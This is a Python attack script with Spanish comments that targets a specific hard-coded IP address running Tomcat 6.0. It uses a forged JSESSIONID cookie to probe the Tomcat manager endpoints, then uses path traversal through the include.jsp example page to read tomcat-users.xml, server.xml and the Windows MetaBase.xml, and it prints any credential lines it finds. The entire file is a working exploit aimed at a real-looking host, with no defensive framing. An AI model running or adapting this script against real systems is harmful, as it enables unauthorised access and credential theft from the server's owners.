#!/usr/bin/env python3
import requests
import sys

def main():
    target_ip = "189.254.143.102"
    base_url = f"https://{target_ip}"
    valid_jsessionid = "00000000000000000000000000000000"
    
    session = requests.Session()
    session.cookies.update({'JSESSIONID': valid_jsessionid})
    session.verify = False
    
    # 1. Probar acceso a manager con sesión válida
    endpoints = [
        "/manager/html",
        "/manager/list", 
        "/manager/status",
        "/manager/jmxproxy",
        "/manager/deploy"
    ]
    
    print("=== TESTING MANAGER ACCESS ===")
    for endpoint in endpoints:
        r = session.get(f"{base_url}{endpoint}")
        print(f"{endpoint}: {r.status_code}")
        if r.status_code == 200:
            print(f"   ⚡ ACCESO CONCEDIDO A {endpoint}")
    
    # 2. Extraer configuraciones via LFI
    print("\n=== EXTRACTING CONFIG FILES ===")
    lfi_paths = [
        "../../../../../../../../Program Files/Apache Software Foundation/Tomcat 6.0/conf/tomcat-users.xml",
        "../../../../../../../../Tomcat 6.0/conf/server.xml",
        "../../../../../../../../WINDOWS/system32/inetsrv/MetaBase.xml"
    ]
    
    for lfi_path in lfi_paths:
        r = session.get(f"{base_url}/examples/jsp/include/include.jsp?page={lfi_path}")
        if "password" in r.text.lower() or "username" in r.text.lower():
            print(f"🔑 CREDENCIALES ENCONTRADAS en {lfi_path}")
            # Extraer líneas con credenciales
            for line in r.text.split('\n'):
                if any(keyword in line.lower() for keyword in ['password', 'username', 'jdbc', 'user']):
                    print(f"   {line.strip()}")

if __name__ == "__main__":
    main()
